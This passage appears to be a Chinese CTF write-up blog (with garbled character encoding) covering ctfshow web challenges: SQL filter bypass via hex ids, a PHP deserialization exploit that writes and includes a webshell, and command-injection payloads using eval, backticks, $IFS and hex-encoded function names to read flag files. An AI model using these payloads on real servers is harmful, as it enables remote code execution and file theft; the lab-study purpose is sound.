class="token keyword">echo</span> <span class="token string">"id: "</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">.</span> <span class="token string">" - title: "</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span><span class="token punctuation">.</span> <span class="token string">" &lt;br>&lt;hr>"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token shell-comment comment"># å…³é—­æ•°æ®åº“è¿æ¥</span>        <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- flag in id = 1000 --></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¦æ±‚æ„é€ id=1000ï¼Œåˆ©ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼š</p><p>æ‰§è¡Œçš„sqlä¸ºï¼šselect * from article where id = 0x3E8 order by id limit 1<br>id: 1000 - title: CTFshowflag </p><hr><p>ctfshow{5b2f045b-59b4-40b3-9034-c59d7670642c}</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>å’Œä¸€ä¸€æ ·ï¼Œå› ä¸ºæ­£åˆ™åŒ¹é…æ‰çš„æ˜¯or</p><h2 id="web3-4-5-6-7"><a href="#web3-4-5-6-7" class="headerlink" title="web3,4,5,6,7"></a>web3,4,5,6,7</h2><p>äºŒè¿›åˆ¶å¯ä»¥ç”¨ï¼Œ?id=0b1111101000</p><h1 id="2021-06-20"><a href="#2021-06-20" class="headerlink" title="2021-06-20"></a>2021-06-20</h1><h2 id="å¤§ç‰›æ¯-easy-unserialize"><a href="#å¤§ç‰›æ¯-easy-unserialize" class="headerlink" title="å¤§ç‰›æ¯-easy_unserialize"></a>å¤§ç‰›æ¯-easy_unserialize</h2><p>æºç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">main</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$settings</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'display_errors'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'On'</span><span class="token punctuation">,</span>        <span class="token string">'allow_url_fopen'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'On'</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'settings.inc'</span><span class="token punctuation">,</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">params</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="çŸ¥è¯†è¡¥å……-phpä¸­æ–‡æ‰‹å†Œ-ï¼š"><a href="#çŸ¥è¯†è¡¥å……-phpä¸­æ–‡æ‰‹å†Œ-ï¼š" class="headerlink" title="çŸ¥è¯†è¡¥å……(phpä¸­æ–‡æ‰‹å†Œ)ï¼š"></a>çŸ¥è¯†è¡¥å……(phpä¸­æ–‡æ‰‹å†Œ)ï¼š</h3><h4 id="unserialize-callback-func-æŒ‡ä»¤"><a href="#unserialize-callback-func-æŒ‡ä»¤" class="headerlink" title="unserialize_callback_func æŒ‡ä»¤"></a>unserialize_callback_func æŒ‡ä»¤</h4><p>å¦‚æœåœ¨è§£åºåˆ—åŒ–çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰ç±»ï¼Œåˆ™å¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°ä»¥ä¾›è°ƒç”¨ï¼ˆä»¥å…å¾—åˆ°çš„æ˜¯ä¸å®Œæ•´çš„ object â€œ__PHP_Incomplete_Classâ€ï¼‰ã€‚å¯é€šè¿‡ php.iniã€ini_set() æˆ– .htaccess å®šä¹‰â€™unserialize_callback_funcâ€™ã€‚æ¯æ¬¡å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰ç±»æ—¶å®ƒéƒ½ä¼šè¢«è°ƒç”¨ã€‚è‹¥è¦ç¦æ­¢è¿™ä¸ªç‰¹æ€§ï¼Œåªéœ€ç½®ç©ºæ­¤è®¾å®šã€‚ </p><h4 id="spl-autoload"><a href="#spl-autoload" class="headerlink" title="spl_autoload"></a>spl_autoload</h4><p>å®ƒå¯ä»¥æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯$class_nameï¼Œè¡¨ç¤ºç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°$file_extensionsæ˜¯å¯é€‰çš„ï¼Œè¡¨ç¤ºç±»æ–‡ä»¶çš„æ‰©å±•åï¼Œå¦‚æœä¸æŒ‡å®šçš„è¯ï¼Œå®ƒå°†ä½¿ç”¨é»˜è®¤çš„æ‰©å±•å.incæˆ–.php</p><h1 id="2021-06-21"><a href="#2021-06-21" class="headerlink" title="2021-06-21"></a>2021-06-21</h1><h2 id="å¤§ç‰›æ¯-easy-unserialize-1"><a href="#å¤§ç‰›æ¯-easy-unserialize-1" class="headerlink" title="å¤§ç‰›æ¯-easy_unserialize"></a>å¤§ç‰›æ¯-easy_unserialize</h2><h3 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>åˆ©ç”¨å›è°ƒå‡½æ•°ï¼ŒåŒæ—¶åˆ©ç”¨file_put_contentså‡½æ•°å¯ä»¥å®ç°å…¶ä¸­çš„æ–‡ä»¶å†…å®¹æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œå¹¶åˆ©ç”¨ini_setè¾¾åˆ°æ–‡ä»¶åŒ…å«ç›®çš„</p><p>å…¶å®unserialize_callback_funcè¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼Œå‡½æ•°çš„å‚æ•°æ˜¯ååºåˆ—åŒ–çš„ç±»åã€‚(ä¸æ­¤è§£æ³•æ— å…³)</p><p>ç„¶åæ ¹æ®æœ¬åœ°expåˆ†æï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">settings</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">main</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$settings</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">settings</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'unserialize_callback_func'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'spl_autoload'</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//$this->params=serialize("&lt;?php system('cat /f*');"); ç”Ÿæˆsettings.incæ–‡ä»¶ï¼Œå†…å®¹æ˜¯&lt;?php system('cat /f*');</span>        <span class="token comment" spellcheck="true">//$this->params=serialize(new settings()); åŠ è½½settings.inc</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶åœ¨ååºåˆ—åŒ–unserialize($this-&gt;params)æ—¶å¦‚æœè®¾ç½®ä¸º$this-&gt;params=serialize(new settings())çš„æ—¶å€™å°±ä¼šè§¦å‘åˆ©ç”¨ini_setè®¾ç½®åçš„è®¾å®šï¼Œini_set(â€˜unserialize_callback_funcâ€™,â€™mycallbackâ€™); å½“ååºåˆ—åŒ–åï¼ŒPHPä¼šå¯»æ‰¾mycallbackè¿™ä¸ªæ–¹æ³•æ¥includeè¿™ä¸ªç±»æ–‡ä»¶ï¼Œå¦‚æœä½ æ²¡å®šä¹‰è¿™ä¸ªæ–¹æ³•åˆ™æŠ¥é”™ã€‚å› ä¸ºspl_autoload å‡½æ•°çš„å­˜åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºsettingsï¼Œç¬¬äºŒä¸ªå‚æ•°é»˜è®¤å®šä¸ºphpå’Œincï¼Œæ‰€ä»¥è¿™é‡Œåˆ™æ˜¯settings.incæ–‡ä»¶ï¼Œæ‰€ä»¥æ­¤æ–‡ä»¶ä¼šè¢«åŒ…å«ï¼Œå‰ææ˜¯è¦å…ˆå†™å…¥æœ¨é©¬ï¼Œæˆ–è€…ä½ è¦å‘½ä»¤æ‰§è¡Œçš„å‚æ•°ï¼Œç„¶åååºåˆ—åŒ–è°ƒç”¨settingsç±»è§¦å‘å°±å¯ä»¥äº†</p><h1 id="å‘½ä»¤æ‰§è¡Œ-2021-06-22"><a href="#å‘½ä»¤æ‰§è¡Œ-2021-06-22" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ(2021-06-22)"></a>å‘½ä»¤æ‰§è¡Œ(2021-06-22)</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>ç»•è¿‡ç‰¹æ®Šå­—ç¬¦çš„è¿‡æ»¤</p><p>payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag.php index.php</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//glob1</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat f?ag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//glob2</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat f\lag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è½¬ä¹‰å­—ç¬¦å®ç°ç»•è¿‡</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat f''lag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php//ç›´æ¥å°†é¢˜ç›®å˜æˆæ–‡ä»¶åŒ…å«æ¼æ´</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//é©¬ä¸­é©¬åµŒå¥—è¿‡æ»¤</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span> `tac fl<span class="token operator">?</span>g<span class="token punctuation">.</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span>`<span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>  <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'nl fl?g.???'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>  <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">'nl fl?g.???'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ­¤å‡½æ•°ä¸åå¼•å·å¼‚æ›²åŒå·¥</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>  <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string">'nl fl?g.???'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å½“æ‰€æ‰§è¡Œçš„ Unix å‘½ä»¤è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼Œéœ€è¦ç›´æ¥ä¼ é€åˆ°æµè§ˆå™¨çš„æ—¶å€™,å°±ç”¨ä»–æ¥ä»£æ›¿execå’Œsystemï¼Œè°ƒç”¨å‘½ä»¤è‡ªåŠ¨å»é™¤éƒ¨åˆ†ç¬¦å·ï¼š",\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å…¶ä»–å‡½æ•°ï¼š"><a href="#å…¶ä»–å‡½æ•°ï¼š" class="headerlink" title="å…¶ä»–å‡½æ•°ï¼š"></a>å…¶ä»–å‡½æ•°ï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//popen("fla?.???", "r");æ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆ</span><span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//å°šæœªç ”ç©¶</span><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//å°šæœªç ”ç©¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è€ƒç‚¹ï¼š-1"><a href="#è€ƒç‚¹ï¼š-1" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>é’ˆå¯¹è¯»å–æ–‡ä»¶çš„å‘½ä»¤è¿›è¡Œäº†ç¦æ­¢ï¼ŒåŒæ—¶å•å¼•å·ã€ç‚¹å’Œç©ºæ ¼ä¹Ÿæ²¡äº†</p><h3 id="payload-å§¿åŠ¿è¦éªš-ï¼š"><a href="#payload-å§¿åŠ¿è¦éªš-ï¼š" class="headerlink" title="payload(å§¿åŠ¿è¦éªš)ï¼š"></a>payload(å§¿åŠ¿è¦éªš)ï¼š</h3><p>ä¸[GXYCTF2019]ç¦æ­¢å¥—å¨ƒä¸€æ ·éªšçš„ä¸€æ‰¹</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span>`nl<span class="token operator">%</span>09fl<span class="token punctuation">[</span>abc<span class="token punctuation">]</span><span class="token operator">*</span>`<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token string">"\x73\x79\x73\x74\x65\x6d"</span><span class="token punctuation">(</span><span class="token string">"nl%09fl[a]*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç­‰ä»·äºsystem(),è¯´æ˜åŒå¼•å·ä¼šè‡ªåŠ¨è§£æ</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>`strings<span class="token operator">%</span>09f<span class="token operator">*</span>`<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token keyword">echo</span>`strings\<span class="token variable">$IFS</span>\<span class="token variable">$9f</span><span class="token operator">*</span>`<span class="token operator">/</span>å¿…é¡»åŠ è½¬ä¹‰å­—ç¬¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ€»ç»“é—®é¢˜ï¼š"><a href="#æ€»ç»“é—®é¢˜ï¼š" class="headerlink" title="æ€»ç»“é—®é¢˜ï¼š"></a>æ€»ç»“é—®é¢˜ï¼š</h3><p><a href="https://www.runoob.com/linux/linux-file-content-manage.html" target="_blank" rel="noopener">Linux æ–‡ä»¶ä¸ç›®å½•ç®¡ç†</a></p><p>linuxæ–‡ä»¶å†…å®¹æŸ¥çœ‹ï¼š</p><ul><li>cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</li><li>tac ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„å€’ç€å†™ï¼</li><li>nl  æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºé“è¾“å‡ºè¡Œå·ï¼</li><li>more ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</li><li>less ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥å¾€å‰ç¿»é¡µï¼</li><li>head åªçœ‹å¤´å‡ è¡Œ</li><li>tail åªçœ‹å°¾å·´å‡ è¡Œ</li><li>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</li><li>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</li><li>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</li><li>sort:å¯ä»¥æŸ¥çœ‹</li><li>uniq:å¯ä»¥æŸ¥çœ‹ file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹ grep(å°šæœªç ”ç©¶)</li><li>åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š grep test *file strings</li></ul><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token 